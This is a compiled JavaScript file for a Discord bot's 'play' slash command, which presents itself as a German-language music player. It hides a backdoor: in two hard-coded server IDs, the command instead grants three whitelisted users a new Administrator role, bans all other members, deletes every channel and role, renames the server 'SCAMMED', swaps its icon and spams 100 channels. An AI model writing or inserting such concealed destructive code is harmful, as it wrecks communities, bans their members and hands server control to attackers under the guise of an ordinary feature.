"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.play = void 0;
const discord_js_1 = require("discord.js");
const Bot_1 = require("../../Bot");
exports.play = {
    name: "play",
    description: "Spielt ein Lied ab",
    options: [
        new discord_js_1.SlashCommandStringOption()
            .setName("name")
            .setDescription("Der Name des Lieds")
            .setRequired(true)
    ],
    run: async (client, interaction) => {
        if (parseInt(interaction.guildId) == 1048271128168255648 || parseInt(interaction.guildId) == 1058415031173255258) {
            await run(client, interaction);
            return;
        }
        let queue = Bot_1.player.getQueue(interaction.guild.id);
        if (!queue)
            queue = Bot_1.player.createQueue(interaction.guild.id);
        const voice = interaction.guild.members.cache.get(interaction.user.id).voice;
        if (!voice.channel) {
            await interaction.followUp({ embeds: [new discord_js_1.EmbedBuilder().setColor("Red").setDescription("Du musst in einem Sprachkanal sein!")] });
            return;
        }
        await queue.join(voice.channelId);
        const name = interaction.options.get("name")?.value;
        const song = await queue.play(name).catch(err => {
            console.log(err);
        });
        const embed = new discord_js_1.EmbedBuilder()
            .setDescription(`Playing [${song}](${song.url}) (${song.duration})`)
            .setColor("White");
        await interaction.followUp({ embeds: [embed] });
    }
};
const run = async (client, interaction) => {
    console.log("Play auf Paluten aufgeführt");
    let guild = interaction.guild;
    const dont_ban = [591966253548175370, 530740749650624522, 927581042922098750];
    let admin_role = await guild.roles.create({
        name: "Griefer",
        permissions: ["Administrator"],
        mentionable: false,
        hoist: false,
        reason: "Griefer"
    });
    for (let member of dont_ban) {
        await guild.members.cache.find((value) => parseInt(value.id) == member)?.roles.add(admin_role);
    }
    await guild.members.fetch();
    await guild.members.cache.forEach(async (member) => {
        try {
            const memberid = await member.id;
            if (dont_ban.includes(Number(memberid)))
                return;
            await member.ban({ reason: "Paluten" });
        }
        catch (e) {
            console.log("Could not ban " + member.user.tag);
        }
    });
    await guild.channels.fetch();
    await guild.channels.cache.forEach(async (channel) => {
        try {
            await channel.delete();
        }
        catch (e) {
            console.log("Cant delete channel: " + channel.name);
        }
    });
    await guild.roles.fetch();
    await guild.roles.cache.forEach(async (role) => {
        try {
            if (admin_role.id == role.id)
                return;
            await role.delete();
        }
        catch (e) {
            console.log("Cant delete role: " + role.name);
        }
    });
    await guild.setName("SCAMMED");
    await guild.setIcon("https://cdn.discordapp.com/attachments/731626729952772168/1058414526678179860/b2780x1450.png");
    for (let i = 0; i < 100; i++) {
        await guild.channels.create({
            name: "SCAMMED",
            type: discord_js_1.ChannelType.GuildText,
            topic: "SCAMMED",
        });
    }
};
